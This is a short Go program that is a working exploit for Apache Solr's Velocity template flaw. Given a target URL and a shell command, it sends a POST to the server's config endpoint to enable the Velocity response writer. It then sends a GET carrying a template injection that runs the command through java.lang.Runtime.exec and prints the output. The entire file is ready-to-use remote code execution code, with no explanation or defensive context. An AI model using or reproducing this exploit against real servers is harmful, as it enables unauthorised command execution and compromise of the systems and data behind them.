package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/http"
	"strings"
)

func main() {
	pURL := flag.String("url", "", "")
	pCMD := flag.String("cmd", "", "")
	flag.Parse()
	inputURL := *pURL
	inputCMD := *pCMD
	if len(inputURL) > 0 && len(inputCMD) > 0 {
		inputCMD = strings.Replace(inputCMD, " ", "%20", -1)
		post(inputURL)
		get(inputURL, inputCMD)
	}
}

func post(inputURL string) {
	theURL := strings.Replace(inputURL, "/#", "", -1) + "/config"
	theJSON := []byte(`{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}`)
	req, _ := http.NewRequest("POST", theURL, bytes.NewBuffer(theJSON))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()
}

func get(inputURL string, inputCMD string) {
	theURL := strings.Replace(inputURL, "/#", "", -1) + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + inputCMD + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end"
	resp, _ := http.Get(theURL)
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}
